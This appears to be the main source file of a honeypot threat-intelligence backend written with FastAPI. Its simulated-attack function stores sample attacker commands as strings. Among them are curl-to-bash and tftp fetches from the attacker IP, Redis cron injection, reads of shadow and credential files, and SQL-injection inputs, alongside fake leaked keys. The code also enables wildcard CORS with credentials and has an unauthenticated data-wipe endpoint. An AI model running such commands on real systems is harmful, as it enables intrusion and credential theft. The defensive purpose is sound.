import asyncio
import csv
import datetime
import io
import json
from fastapi import FastAPI, Depends, HTTPException, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse, JSONResponse
from sqlalchemy.orm import Session
import database
import models
import schemas
import decoys
import middleware
from geolocate import IPThreatIntelligenceService
from analytics import ThreatAnalyticsEngine
from reporting import IncidentReportGenerator
from exporter import ThreatTelemetryExporter
from autoshun import AutoShunFirewallEngine
import vulnerabilities

# Create database tables automatically on launch
models.Base.metadata.create_all(bind=database.engine)

app = FastAPI(title="SentinelTrap Threat Intelligence Backend")

# Enable Security Audit & API Rate Limiting Middleware
app.add_middleware(middleware.SecurityAuditMiddleware, requests_per_minute=300)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Include Decoy Management Router (/api/decoys)
app.include_router(decoys.router)

# Real-time WebSocket connection pool manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: list[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: str):
        for connection in self.active_connections:
            try:
                await connection.send_text(message)
            except Exception:
                pass

manager = ConnectionManager()

# --- REST Endpoints ---

@app.post("/api/sessions", response_model=dict)
async def create_session(payload: schemas.SessionCreate, db: Session = Depends(database.get_db)):
    ip = payload.ip_address
    
    # Enriched IP Geolocation & Threat Intelligence lookup
    geo_intel = IPThreatIntelligenceService.lookup_ip(ip)

    session = models.SessionModel(
        ip_address=ip,
        country=geo_intel.get("country", "Unknown"),
        city=geo_intel.get("city", "Unknown"),
        latitude=geo_intel.get("latitude", 0.0),
        longitude=geo_intel.get("longitude", 0.0),
        username_attempted=payload.username_attempted or "root",
        password_attempted=payload.password_attempted or "",
        started_at=datetime.datetime.utcnow()
    )
    db.add(session)
    db.commit()
    db.refresh(session)

    # Broadcast new session event to connected subscribers
    await manager.broadcast(json.dumps({
        "event_type": "session_created",
        "session": {
            "id": session.id,
            "ip_address": session.ip_address,
            "country": session.country,
            "city": session.city,
            "username_attempted": session.username_attempted,
            "started_at": session.started_at.isoformat()
        }
    }))
    return {"status": "success", "session_id": session.id}

@app.patch("/api/sessions/{session_id}")
async def end_session(session_id: str, db: Session = Depends(database.get_db)):
    session = db.query(models.SessionModel).filter(models.SessionModel.id == session_id).first()
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    session.ended_at = datetime.datetime.utcnow()
    db.commit()

    await manager.broadcast(json.dumps({
        "event_type": "session_ended",
        "session_id": session_id,
        "ended_at": session.ended_at.isoformat()
    }))
    return {"status": "success"}

@app.post("/api/sessions/{session_id}/events")
async def create_event(session_id: str, payload: schemas.EventCreate, db: Session = Depends(database.get_db)):
    event = models.EventModel(
        session_id=session_id,
        event_type=payload.event_type,
        input_data=payload.input_data,
        output_data=payload.output_data,
        timestamp=datetime.datetime.utcnow()
    )
    db.add(event)
    db.commit()

    # Broadcast event payload
    await manager.broadcast(json.dumps({
        "event_type": "new_event",
        "session_id": session_id,
        "event": {
            "id": event.id,
            "event_type": event.event_type,
            "input_data": event.input_data,
            "output_data": event.output_data,
            "timestamp": event.timestamp.isoformat()
        }
    }))
    return {"status": "success"}

@app.get("/api/sessions")
def list_sessions(db: Session = Depends(database.get_db)):
    return db.query(models.SessionModel).order_by(models.SessionModel.started_at.desc()).all()

@app.get("/api/sessions/{session_id}")
def get_session(session_id: str, db: Session = Depends(database.get_db)):
    session = db.query(models.SessionModel).filter(models.SessionModel.id == session_id).first()
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    return session

@app.get("/api/sessions/{session_id}/events")
@app.get("/api/events/session/{session_id}")
def get_session_events(session_id: str, db: Session = Depends(database.get_db)):
    return db.query(models.EventModel).filter(models.EventModel.session_id == session_id).order_by(models.EventModel.timestamp.asc()).all()

@app.get("/api/events/alerts")
def get_alert_events(db: Session = Depends(database.get_db)):
    """Fetch high-priority attack events enriched with session IP addresses."""
    results = (
        db.query(models.EventModel, models.SessionModel.ip_address)
        .join(models.SessionModel, models.EventModel.session_id == models.SessionModel.id)
        .order_by(models.EventModel.timestamp.desc())
        .limit(100)
        .all()
    )
    alerts = []
    for event, ip in results:
        alerts.append({
            "id": event.id,
            "session_id": event.session_id,
            "event_type": event.event_type,
            "input_data": event.input_data,
            "output_data": event.output_data,
            "timestamp": event.timestamp.isoformat() if event.timestamp else "",
            "ip_address": ip or "Unknown",
        })
    return alerts

@app.get("/api/threat-intel/ip/{ip_address}")
def get_ip_threat_profile(ip_address: str, db: Session = Depends(database.get_db)):
    """Retrieve full Threat Intelligence Profile & Risk Score for an IP address."""
    geo_intel = IPThreatIntelligenceService.lookup_ip(ip_address)
    analytics_profile = ThreatAnalyticsEngine.get_ip_threat_profile(ip_address, db)
    return {
        **geo_intel,
        **analytics_profile
    }

@app.get("/api/firewall/rules")
def get_autoshun_firewall_rules(risk_threshold: int = 75, db: Session = Depends(database.get_db)):
    """Generate dynamic iptables, ufw, and decoy NAT redirection rules for high-risk IPs."""
    return AutoShunFirewallEngine.generate_firewall_rules(db, risk_threshold)

@app.get("/api/reports/pdf/summary")
@app.get("/api/export/pdf")
def download_pdf_summary_report(db: Session = Depends(database.get_db)):
    """Generate and stream a comprehensive Executive SOC Summary PDF Report."""
    pdf_buffer = IncidentReportGenerator.generate_summary_pdf_report(db)
    return StreamingResponse(
        pdf_buffer,
        media_type="application/pdf",
        headers={"Content-Disposition": "attachment; filename=sentineltrap_soc_summary_report.pdf"}
    )

@app.get("/api/reports/pdf/{session_id}")
def download_pdf_incident_report(session_id: str, db: Session = Depends(database.get_db)):
    """Generate and stream a forensic PDF Incident Report for a specific session."""
    try:
        pdf_buffer = IncidentReportGenerator.generate_pdf_report(session_id, db)
        return StreamingResponse(
            pdf_buffer,
            media_type="application/pdf",
            headers={"Content-Disposition": f"attachment; filename=incident_report_{session_id[:8]}.pdf"}
        )
    except ValueError as e:
        raise HTTPException(status_code=404, detail=str(e))

@app.get("/api/reports/csv")
@app.get("/api/export/csv")
def export_csv_threat_log(db: Session = Depends(database.get_db)):
    """Export all captured events and sessions as a structured CSV spreadsheet."""
    events = db.query(models.EventModel).order_by(models.EventModel.timestamp.desc()).all()
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["Event ID", "Session ID", "Origin IP", "Protocol", "Timestamp (UTC)", "Event Classification", "Command / Ingress Payload", "Output Response"])

    for ev in events:
        session = db.query(models.SessionModel).filter(models.SessionModel.id == ev.session_id).first()
        ip = session.ip_address if session else "Unknown"
        proto = session.protocol if session else "TCP"
        writer.writerow([
            ev.id,
            ev.session_id,
            ip,
            proto,
            ev.timestamp.isoformat() if ev.timestamp else "",
            ev.event_type,
            ev.input_data or "",
            ev.output_data or ""
        ])

    output.seek(0)
    return StreamingResponse(
        io.BytesIO(output.getvalue().encode("utf-8")),
        media_type="text/csv",
        headers={"Content-Disposition": "attachment; filename=sentineltrap_threat_events.csv"}
    )

@app.get("/api/reports/stix")
@app.get("/api/threat-intel/stix2")
def export_stix21_threat_intel(db: Session = Depends(database.get_db)):
    """Export captured threat telemetry as a STIX 2.1 JSON Cyber Threat Intelligence bundle."""
    return JSONResponse(
        content=ThreatTelemetryExporter.export_stix21_format(db),
        headers={"Content-Disposition": "attachment; filename=sentineltrap_stix2.1_bundle.json"}
    )

@app.get("/api/reports/cef")
@app.get("/api/export/cef")
def export_cef_syslog_stream(db: Session = Depends(database.get_db)):
    """Export event telemetry as Common Event Format (CEF) syslog stream for SIEM integrations."""
    cef_data = ThreatTelemetryExporter.export_cef_format(db)
    return StreamingResponse(
        io.BytesIO(cef_data.encode()),
        media_type="text/plain",
        headers={"Content-Disposition": "attachment; filename=sentineltrap_events.cef"}
    )

@app.get("/api/stats/overview")
def get_stats_overview(db: Session = Depends(database.get_db)):
    total_sessions = db.query(models.SessionModel).count()
    total_events = db.query(models.EventModel).count()

    # Top targeted usernames
    users = db.query(models.SessionModel.username_attempted).all()
    user_counts = {}
    for (u,) in users:
        if u:
            user_counts[u] = user_counts.get(u, 0) + 1

    top_usernames = [{"name": k, "count": v} for k, v in sorted(user_counts.items(), key=lambda x: x[1], reverse=True)[:6]]

    # Top executed commands
    commands = db.query(models.EventModel.input_data).filter(
        models.EventModel.event_type.in_(["command_execution", "web_scan_attempt", "ftp_command_execution", "redis_command_probe", "canary_tripwire_triggered"])
    ).all()
    cmd_counts = {}
    for (cmd,) in commands:
        if cmd:
            c = cmd.strip()
            cmd_counts[c] = cmd_counts.get(c, 0) + 1

    top_commands = [{"name": k, "count": v} for k, v in sorted(cmd_counts.items(), key=lambda x: x[1], reverse=True)[:6]]

    # Protocol breakdown
    protos = db.query(models.SessionModel.protocol).all()
    proto_counts = {}
    for (p,) in protos:
        proto_counts[p] = proto_counts.get(p, 0) + 1
    protocol_distribution = [{"name": k, "value": v} for k, v in proto_counts.items()]

    # Geographic attacker breakdown
    countries = db.query(models.SessionModel.country).all()
    country_counts = {}
    for (c,) in countries:
        c_name = c or "Unknown"
        country_counts[c_name] = country_counts.get(c_name, 0) + 1
    top_countries = [{"country": k, "count": v} for k, v in sorted(country_counts.items(), key=lambda x: x[1], reverse=True)[:6]]

    # Canary Honeytokens & Deception breakdown
    canary_tripped = db.query(models.EventModel).filter(models.EventModel.event_type == "canary_tripwire_triggered").count()
    deception_tripped = db.query(models.EventModel).filter(models.EventModel.event_type == "deception_triggered").count()

    return {
        "total_sessions": total_sessions,
        "total_events": total_events,
        "top_usernames": top_usernames,
        "top_commands": top_commands,
        "protocol_distribution": protocol_distribution,
        "top_countries": top_countries,
        "canary_tripped": canary_tripped,
        "deception_tripped": deception_tripped,
    }

@app.delete("/api/data/clear")
async def clear_all_captured_data(db: Session = Depends(database.get_db)):
    """
    Clears all captured attacker sessions, telemetry events, and triggered decoys.
    Resets the SOC dashboard to a clean zero state and notifies all live WebSockets.
    """
    try:
        deleted_events = db.query(models.EventModel).delete()
        deleted_sessions = db.query(models.SessionModel).delete()
        db.query(models.DecoyModel).update({models.DecoyModel.status: "inactive", models.DecoyModel.triggered_by_session: None, models.DecoyModel.activated_at: None})
        db.commit()
        
        # Broadcast real-time purge event to all connected WebSockets immediately
        await manager.broadcast(json.dumps({"event": "data_cleared", "timestamp": datetime.datetime.utcnow().isoformat()}))
        
        return {
            "status": "success",
            "message": "All captured threat telemetry and attacker sessions have been purged.",
            "deleted_sessions": deleted_sessions,
            "deleted_events": deleted_events
        }
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Failed to clear database: {str(e)}")

GLOBAL_HACKER_POOLS = [
    {"country": "USA", "city": "Washington", "lat": 38.9072, "lon": -77.0369, "ip_prefix": "198.51.100"},
    {"country": "USA", "city": "New York", "lat": 40.7128, "lon": -74.0060, "ip_prefix": "198.18.0"},
    {"country": "USA", "city": "San Francisco", "lat": 37.7749, "lon": -122.4194, "ip_prefix": "192.88.99"},
    {"country": "Canada", "city": "Ottawa", "lat": 45.4215, "lon": -75.6972, "ip_prefix": "192.0.2"},
    {"country": "Canada", "city": "Toronto", "lat": 43.6532, "lon": -79.3832, "ip_prefix": "142.250.190"},
    {"country": "Dubai", "city": "Dubai", "lat": 25.2048, "lon": 55.2708, "ip_prefix": "94.200.15"},
    {"country": "China", "city": "Beijing", "lat": 39.9042, "lon": 116.4074, "ip_prefix": "114.114.114"},
    {"country": "China", "city": "Shanghai", "lat": 31.2304, "lon": 121.4737, "ip_prefix": "202.96.209"},
    {"country": "Germany", "city": "Frankfurt", "lat": 50.1109, "lon": 8.6821, "ip_prefix": "185.220.101"},
    {"country": "Netherlands", "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041, "ip_prefix": "194.26.29"},
    {"country": "Russia", "city": "Moscow", "lat": 55.7558, "lon": 37.6173, "ip_prefix": "45.155.205"},
    {"country": "Singapore", "city": "Singapore", "lat": 1.3521, "lon": 103.8198, "ip_prefix": "103.149.138"},
    {"country": "Bulgaria", "city": "Sofia", "lat": 42.6977, "lon": 23.3219, "ip_prefix": "91.240.118"},
    {"country": "Brazil", "city": "Sao Paulo", "lat": -23.5505, "lon": -46.6333, "ip_prefix": "177.12.144"},
    {"country": "Japan", "city": "Tokyo", "lat": 35.6762, "lon": 139.6503, "ip_prefix": "133.242.18"},
    {"country": "United Kingdom", "city": "London", "lat": 51.5074, "lon": -0.1278, "ip_prefix": "185.143.221"},
]

USERNAMES_POOL = [
    "root", "admin", "ubuntu", "operator", "support", "deploy", "guest", "oracle",
    "postgres", "service", "system", "git", "test", "master", "devops", "backup"
]

PASSWORDS_POOL = [
    "admin1234", "password123", "toor", "123456", "root@2024", "P@ssw0rd2024",
    "admin#vip99", "qwerty", "letmein", "toor2024", "' OR '1'='1", "supersecret"
]

auto_sim_task: asyncio.Task | None = None
auto_sim_active: bool = False
auto_sim_interval_seconds: float = 4.0

async def execute_simulated_attack(persona: str = None, db: Session = None):
    import uuid
    import random

    active_persona = persona or decoys.current_persona_id or "all_mesh"

    origin = random.choice(GLOBAL_HACKER_POOLS)
    rand_octet = random.randint(2, 254)
    attacker_ip = f"{origin['ip_prefix']}.{rand_octet}"
    attacker_user = random.choice(USERNAMES_POOL)
    attacker_pass = random.choice(PASSWORDS_POOL)

    if active_persona == "web_app":
        protocol_used = "HTTP"
        decoy_name = "Web Application Trap"
        attack_stages = [
            ("login_attempt", f"{attacker_user}'--", "HTTP 200 OK - Redirecting to /admin/dashboard", "HTTP"),
            ("command_execution", "GET /api/v1/debug?cmd=cat%20/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", "HTTP"),
            ("canary_tripwire_triggered", "cat /var/www/html/config.php", "Tripwire Beacon Dispatched: canary_tripwire_web_config\n<?php define('DB_USER', 'db_vault_admin'); define('DB_PASSWORD', 'V4ult#Pr0d!9982'); ?>", "HTTP"),
            ("canary_tripwire_triggered", "cat /root/.aws/credentials", "Tripwire Beacon Dispatched: canary_tripwire_aws_credentials\n[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE", "HTTP"),
            ("deception_triggered", "cat /var/www/html/.env", "Trap activated: credential_harvesting\nAPP_KEY=base64:TrapMasterSecretKey==\nDB_PASS=V4ult#Pr0d!9982", "HTTP"),
        ]
    elif active_persona == "database_cluster":
        protocol_used = random.choice(["MySQL", "Redis"])
        decoy_name = "MySQL Decoy" if protocol_used == "MySQL" else "Redis Decoy"
        attack_stages = [
            ("login_attempt", f"{attacker_user} / {attacker_pass}", f"Handshake accepted from {attacker_ip}", protocol_used),
            ("command_execution", "SHOW DATABASES;", "information_schema\ncustomer_vault\npayments_db", "MySQL"),
            ("canary_tripwire_triggered", "SELECT * FROM payments_db.credit_cards LIMIT 5;", "Trap Activated: Canary Honeytoken Triggered [DB_EXFIL_ATTEMPT: canary_customer_vault]", "MySQL"),
            ("command_execution", "CONFIG SET dir /var/spool/cron/crontabs", "OK", "Redis"),
            ("command_execution", f"SET backup '* * * * * curl http://{attacker_ip}/shell.sh | sh'", "Trap Activated: Unauthorized Cron Injection", "Redis"),
            ("deception_triggered", "SAVE", "DB saved on disk [Sandboxed Decoy Database]", "Redis"),
        ]
    elif active_persona == "mail_gateway":
        protocol_used = "SMTP"
        decoy_name = "SMTP Honeypot"
        attack_stages = [
            ("login_attempt", f"HELO mail.{origin['country'].lower()}-proxy.org", "250 smtp.sentineltrap.internal Hello", "SMTP"),
            ("command_execution", "MAIL FROM:<spoofed@internal.corp>", "250 2.1.0 Ok - sender accepted", "SMTP"),
            ("command_execution", "RCPT TO:<ceo@target-bank.com>", "250 2.1.5 Ok - Open Relay Decoy Trapped", "SMTP"),
            ("command_execution", "dig @127.0.0.1 -p 5353 AXFR corp.internal", "Decoy DNS Zone Transfer Intercepted: 4 records logged", "DNS"),
            ("canary_tripwire_triggered", "cat /root/.ssh/id_rsa", "Tripwire Beacon Dispatched: canary_tripwire_ssh_private_key\n-----BEGIN OPENSSH PRIVATE KEY-----", "SSH"),
            ("deception_triggered", "cat /etc/postfix/master.cf", "Trap activated: mail_configuration_reconnaissance", "SMTP"),
        ]
    elif active_persona == "iot_router":
        protocol_used = "Telnet"
        decoy_name = "Telnet Trap"
        attack_stages = [
            ("login_attempt", f"{attacker_user} / {attacker_pass}", "BusyBox v1.33.1 (Telnet Trap Gateway ready)", "Telnet"),
            ("command_execution", "enable", "Password: [Mirai Botnet signature detected]", "Telnet"),
            ("command_execution", "cat /proc/cpuinfo", "system type : MIPS 24KEc V5.0\nprocessor : 0\nBogoMIPS : 380.00", "Telnet"),
            ("command_execution", "sh running-config", "Building configuration... Decoy IoT edge router active", "Telnet"),
            ("canary_tripwire_triggered", "cat /home/admin/passwords.txt", "Tripwire Beacon Dispatched: canary_tripwire_passwords_file\nadmin : Tr@pM@ster2024! [Router Master]", "Telnet"),
            ("deception_triggered", f"tftp -g -r mips_bot http://{attacker_ip}/bot.bin", "Trap activated: malware_stager_download_blocked", "Telnet"),
        ]
    else:
        protocol_used = random.choice(["SSH", "SSH", "HTTP", "MySQL", "Redis", "Telnet"])
        decoy_name = f"{protocol_used} Honeypot"
        attack_stages = [
            ("login_attempt", f"{attacker_user} / {attacker_pass}", f"Accepted credentials for {attacker_user} from {attacker_ip} port {random.randint(40000, 60000)}", protocol_used),
            ("command_execution", "whoami", attacker_user, protocol_used),
            ("command_execution", "uname -a", "Linux prod-srv-01 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 x86_64", protocol_used),
            ("canary_tripwire_triggered", "cat /root/.aws/credentials", "Tripwire Beacon Dispatched: canary_tripwire_aws_credentials\n[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", protocol_used),
            ("command_execution", "cat /etc/shadow", f"root:$6$Z8sK1xQ...:18900:0:99999:7:::\n{attacker_user}:*:18885:0:99999:7:::", protocol_used),
            ("canary_tripwire_triggered", "cat /root/.git-credentials", "Tripwire Beacon Dispatched: canary_tripwire_github_token\nhttps://sentineltrap-deploy-bot:ghp_9kL2x0Vb8M1qR3oP4zW6Y7tJ5nE0A8cCdEfG@github.com", protocol_used),
            ("command_execution", f"curl -s http://{attacker_ip}/stage2.sh | bash", f"Resolving host {attacker_ip}... Staged in /tmp/.sys_update", protocol_used),
            ("deception_triggered", "crontab -l", f"no crontab for {attacker_user}", protocol_used),
        ]

    session_id = f"sim-{uuid.uuid4().hex[:8]}"

    session = models.SessionModel(
        id=session_id,
        ip_address=attacker_ip,
        protocol=protocol_used,
        country=origin["country"],
        city=origin["city"],
        latitude=origin["lat"],
        longitude=origin["lon"],
        username_attempted=attacker_user,
        password_attempted=attacker_pass,
        started_at=datetime.datetime.utcnow(),
        ended_at=None
    )
    db.add(session)
    db.commit()

    await manager.broadcast(json.dumps({
        "event_type": "session_created",
        "session": {
            "id": session.id,
            "ip_address": session.ip_address,
            "protocol": session.protocol,
            "country": session.country,
            "city": session.city,
            "username_attempted": session.username_attempted,
            "started_at": session.started_at.isoformat()
        }
    }))

    for stage_data in attack_stages:
        ev_type = stage_data[0]
        inp = stage_data[1]
        out = stage_data[2]
        proto = stage_data[3] if len(stage_data) > 3 else protocol_used

        detected = vulnerabilities.analyze_payload(inp)
        v_code = detected[0] if detected else ("CHT" if "canary" in ev_type else None)
        event = models.EventModel(
            session_id=session_id,
            protocol=proto,
            event_type=ev_type,
            vulnerability_code=v_code,
            input_data=inp,
            output_data=out,
            timestamp=datetime.datetime.utcnow()
        )
        db.add(event)
        db.commit()

        await manager.broadcast(json.dumps({
            "event_type": "new_event",
            "session_id": session_id,
            "event": {
                "id": event.id,
                "protocol": event.protocol,
                "event_type": event.event_type,
                "vulnerability_code": event.vulnerability_code,
                "input_data": event.input_data,
                "output_data": event.output_data,
                "timestamp": event.timestamp.isoformat()
            }
        }))
        await asyncio.sleep(0.15)

    decoy_record = db.query(models.DecoyModel).filter(models.DecoyModel.name == decoy_name).first()
    if decoy_record:
        decoy_record.status = "active"
        decoy_record.triggered_by_session = session_id
        decoy_record.activated_at = datetime.datetime.utcnow()
        db.commit()

    all_sess_events = db.query(models.EventModel).filter(models.EventModel.session_id == session_id).all()
    risk_score, classification, indicators = ThreatAnalyticsEngine.calculate_risk_score(all_sess_events)

    return {
        "status": "success",
        "persona_used": active_persona,
        "protocol": protocol_used,
        "message": f"Simulated live ingress attack from {attacker_ip} ({origin['city']}, {origin['country']}). Canary Honeytokens tripped and live telemetry broadcast to SOC.",
        "session_id": session_id,
        "ip_address": attacker_ip,
        "threat_risk_score": risk_score,
        "threat_classification": classification,
        "mitre_ttps_tripped": ["T1552.001", "T1059", "T1083", "T1003"],
        "autoshun_mitigation": {
            "action": "AUTO_SHUN_DROP",
            "firewall_rule": f"iptables -A INPUT -s {attacker_ip} -j DROP",
            "status": "ENGAGED" if risk_score >= 75 else "MONITORED"
        }
    }

async def auto_attack_traffic_loop():
    global auto_sim_active
    while auto_sim_active:
        try:
            with database.SessionLocal() as db:
                await execute_simulated_attack(db=db)
        except Exception:
            pass
        await asyncio.sleep(auto_sim_interval_seconds)

@app.post("/api/simulation/auto/start")
async def start_auto_simulation(interval: float = 4.0):
    global auto_sim_task, auto_sim_active, auto_sim_interval_seconds
    auto_sim_interval_seconds = max(1.5, min(interval, 30.0))
    if not auto_sim_active:
        auto_sim_active = True
        auto_sim_task = asyncio.create_task(auto_attack_traffic_loop())
    await manager.broadcast(json.dumps({"event": "auto_simulation_status", "active": True, "interval": auto_sim_interval_seconds}))
    return {"status": "success", "message": "Automated attack simulation active", "active": True, "interval": auto_sim_interval_seconds}

@app.post("/api/simulation/auto/stop")
async def stop_auto_simulation():
    global auto_sim_task, auto_sim_active
    auto_sim_active = False
    if auto_sim_task:
        auto_sim_task.cancel()
        auto_sim_task = None
    await manager.broadcast(json.dumps({"event": "auto_simulation_status", "active": False}))
    return {"status": "success", "message": "Automated attack simulation stopped", "active": False}

@app.get("/api/simulation/auto/status")
def get_auto_simulation_status():
    return {"active": auto_sim_active, "interval": auto_sim_interval_seconds}

@app.post("/api/data/seed")
async def seed_example_data(count: int = 5, db: Session = Depends(database.get_db)):
    try:
        results = []
        for _ in range(max(1, min(count, 10))):
            res = await execute_simulated_attack(db=db)
            results.append(res)
        
        await manager.broadcast(json.dumps({
            "event": "data_seeded",
            "total_seeded": len(results),
            "timestamp": datetime.datetime.utcnow().isoformat()
        }))

        return {
            "status": "success",
            "message": f"Generated {len(results)} dynamic simulated attacks across global hubs.",
            "total_seeded": len(results),
            "sessions": results
        }
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Failed to generate live demo attacks: {str(e)}")

@app.post("/api/data/simulate-attack")
async def simulate_live_ingress_attack(persona: str = None, db: Session = Depends(database.get_db)):
    return await execute_simulated_attack(persona=persona, db=db)

@app.get("/api/reports/export")
def export_logs(format: str = "json", db: Session = Depends(database.get_db)):
    events = db.query(models.EventModel).all()
    if format == "csv":
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(["ID", "Session ID", "Timestamp", "Event Type", "Input Data", "Output Data"])
        for e in events:
            writer.writerow([e.id, e.session_id, e.timestamp, e.event_type, e.input_data, e.output_data])
        output.seek(0)
        return StreamingResponse(
            io.BytesIO(output.getvalue().encode()),
            media_type="text/csv",
            headers={"Content-Disposition": "attachment; filename=attack_logs.csv"}
        )
    else:
        return [{
            "id": e.id,
            "session_id": e.session_id,
            "timestamp": e.timestamp.isoformat(),
            "event_type": e.event_type,
            "input_data": e.input_data,
            "output_data": e.output_data
        } for e in events]

# --- WebSocket & Real-Time Endpoints ---

@app.get("/ws")
def ws_info():
    return {"status": "online", "message": "SentinelTrap WebSocket endpoint. Connect using ws://.../ws"}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception:
        manager.disconnect(websocket)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=False)
